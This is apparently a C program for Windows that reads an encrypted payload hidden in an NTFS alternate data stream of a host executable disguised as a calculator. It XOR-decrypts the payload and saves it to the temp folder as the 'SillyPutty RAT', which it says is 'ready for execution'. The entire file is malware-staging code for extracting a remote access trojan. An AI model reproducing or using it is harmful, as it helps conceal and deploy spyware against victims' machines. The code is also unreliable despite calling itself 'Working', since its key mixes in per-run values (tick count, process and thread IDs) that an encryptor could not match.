#include <windows.h>
#include <stdio.h>

// Generate the same key as the S12 encryptor
void GenerateS12Key(PBYTE key, DWORD keySize, const char* seed) {
    DWORD seedHash = 0x811C9DC5; // FNV-1a hash
    
    // Hash the seed
    for (int i = 0; seed[i]; i++) {
        seedHash ^= seed[i];
        seedHash *= 0x01000193;
    }
    
    // Use entropy sources (same as encryptor)
    DWORD entropy1 = GetTickCount();
    DWORD entropy2 = GetCurrentProcessId();
    DWORD entropy3 = (DWORD)GetCurrentThreadId();
    
    // Generate key
    for (DWORD i = 0; i < keySize; i++) {
        key[i] = (BYTE)((seedHash >> (i % 4) * 8) ^ 
                       (entropy1 >> (i % 4) * 8) ^
                       (entropy2 >> (i % 4) * 8) ^
                       (entropy3 >> (i % 4) * 8) ^
                       (i * 37));
        
        seedHash = ((seedHash << 5) + seedHash) + i;
    }
}

// Simple XOR decryption (since we confirmed it's simple XOR)
void SimpleXORDecrypt(PBYTE data, DWORD size, const char* keySeed) {
    printf("Applying simple XOR decryption...\n");
    
    // Generate the decryption key
    BYTE key[64];
    GenerateS12Key(key, sizeof(key), keySeed);
    
    // Apply XOR with the generated key
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key[i % 64];
    }
    
    printf("XOR decryption completed.\n");
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Working XOR Decryptor v1.0\n");
        printf("==========================\n");
        printf("Based on confirmed simple XOR encryption\n");
        printf("Usage: %s <host_file> <key_seed>\n", argv[0]);
        printf("Example: %s s12_calculator.exe s12secret2025\n", argv[0]);
        return 1;
    }
    
    printf("Working XOR Decryptor v1.0\n");
    printf("==========================\n");
    printf("Host: %s\n", argv[1]);
    printf("Seed: %s\n\n", argv[2]);
    
    // Open ADS stream
    char adsPath[MAX_PATH];
    snprintf(adsPath, sizeof(adsPath), "%s:s12data", argv[1]);
    
    HANDLE hADS = CreateFileA(adsPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hADS == INVALID_HANDLE_VALUE) {
        printf("❌ Cannot open ADS stream: %s\n", adsPath);
        return 1;
    }
    
    DWORD payloadSize = GetFileSize(hADS, NULL);
    printf("📦 Payload size: %lu bytes\n", payloadSize);
    
    // Read encrypted payload
    PBYTE payload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    DWORD bytesRead;
    ReadFile(hADS, payload, payloadSize, &bytesRead, NULL);
    CloseHandle(hADS);
    
    printf("📥 Read %lu bytes from ADS\n", bytesRead);
    
    // Show first 16 bytes before decryption
    printf("\n🔐 Before decryption: ");
    for (int i = 0; i < 16; i++) printf("%02X ", payload[i]);
    printf("\n");
    
    // Apply simple XOR decryption
    SimpleXORDecrypt(payload, payloadSize, argv[2]);
    
    // Show first 16 bytes after decryption
    printf("🔓 After decryption:  ");
    for (int i = 0; i < 16; i++) printf("%02X ", payload[i]);
    printf("\n");
    
    // Verify PE header
    if (payload[0] == 0x4D && payload[1] == 0x5A) {
        printf("\n✅ SUCCESS! Valid PE header (MZ) found!\n");
        
        // Save decrypted SillyPutty
        char outFile[MAX_PATH];
        GetTempPathA(MAX_PATH, outFile);
        strcat(outFile, "\\WORKING_sillyputty.exe");
        
        HANDLE hOut = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hOut, payload, payloadSize, &written, NULL);
            CloseHandle(hOut);
            
            printf("💾 Decrypted SillyPutty saved: %s\n", outFile);
            printf("📏 File size: %lu bytes\n", written);
            printf("\n🎯 MISSION ACCOMPLISHED!\n");
            printf("The SillyPutty RAT has been successfully extracted!\n");
            
            printf("\n⚠️  SAFE MODE NOTICE:\n");
            printf("File is ready for execution but saved for safety.\n");
            printf("Manual execution available if needed for research.\n");
            
        } else {
            printf("❌ Could not save decrypted file\n");
        }
        
    } else {
        printf("\n❌ Invalid PE header after decryption\n");
        printf("Got: %02X %02X (expected: 4D 5A)\n", payload[0], payload[1]);
        
        // Save for debugging
        char debugFile[MAX_PATH];
        GetTempPathA(MAX_PATH, debugFile);
        strcat(debugFile, "\\debug_decrypt.bin");
        
        HANDLE hDebug = CreateFileA(debugFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hDebug != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hDebug, payload, payloadSize, &written, NULL);
            CloseHandle(hDebug);
            printf("Debug file saved: %s\n", debugFile);
        }
    }
    
    HeapFree(GetProcessHeap(), 0, payload);
    return 0;
}
